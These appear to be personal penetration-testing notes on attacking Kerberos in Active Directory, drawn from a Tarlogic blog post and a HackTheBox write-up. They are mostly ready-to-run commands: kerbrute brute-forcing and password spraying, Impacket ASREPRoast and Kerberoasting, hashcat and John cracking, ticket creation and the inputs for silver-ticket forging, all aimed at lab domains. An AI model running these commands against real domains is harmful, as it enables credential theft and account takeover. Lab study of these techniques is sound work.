CREDITS TO THE WEBSITE: https://www.tarlogic.com/blog/how-to-attack-kerberos/

FROM LINUX:

Kerberos brute-force
kerbrute -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt

ASREPRoast
/usr/share/doc/python3-impacket/examples/GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
Cracking the AS_REP:
Hashcat command: root@kali:impacket-examples# hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
John command: root@kali:kali# john --wordlist=passwords_kerb.txt hashes.asreproast

Kerberoasting
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py jurassic.park/triceratops:Sh4rpH0rns -outputfile hashes.kerberoast
need to test: /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request scrm.local/ksimpson -k -no-pass -dc-ip <<IP>>

____________________________________________________________________________________________________________________________________________________
https://harrynorthover.com/articles/scrambled-hackthebox-writeup

Creating A Ticket

    "...Because we cannot access the server using NTLM, we'll have to generate our Ticket Granting Ticket for ksimpson. This means we can then use Kerberos       authentication with other Impacket tools..." (In other words: If I can't logging using NTLM (normal use to enter winrm and smb, por example), but 	k	 kerberos is available, I can try to access the computer using kerberos tickets). So, every access/login, I need to have a ticket (export 					KRB5CCNAME=ksimpson.ccache).
    /usr/share/doc/python3-impacket/examples/getTGT.py scrm.local/ksimpson:ksimpson -dc-ip $i
	
	<<<Do you want to log as John? Need to create a ticket to John. Wanna log after as Mary? Need to creat a ticket to Mary...>>>
	
    "Once we have our ticket, we need to export it so Impacket tools can utilise it"
	export KRB5CCNAME=ksimpson.ccache 
	
	"Now that we can authenticate properly with our TGT, let's try and search for Service Accounts/SPN and see if we get any keys to crack."
	/usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request scrm.local/ksimpson -k -no-pass -dc-ip <<IP>>
	
	"Keeping our new sqlsvc credentials aside, let's continue using our new TGT to access the SMB shares:"
	smbclient.py scrm.local/ksimpson:ksimpson@dc1.scrm.local -dc-ip scrambled.htb -debug -k
	
Going For Silver

	We have credentials for a service account, and we know its full Service Principal Name so now we can make use of Impackets ticketer.py. To do that we need the following
	NTHash - This is the sqlsvc's password converted to an NTLM hash.
	Domain SID - The security identifier of the domain we want to access.
	Domain - scrm.local.
	Service Principal Name - We can get this from the result of running`GetUserSPNs.py' - MSSQLSvc/dc1.scrm.local.
	User Id - 500.
	
	
	In case of error using the impateck tool: https://github.com/SecureAuthCorp/impacket/issues/1206
	
______________________________________________________________________________________________________________________________________________


Kerberos brute-force
./kerbrute userenum -d lab.htb --dc <<IP>> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
Password spraying
./kerbrute passwordspray -d support.htb --dc $ip ../userlist.txt /usr/share/wordlists/rockyou.txt




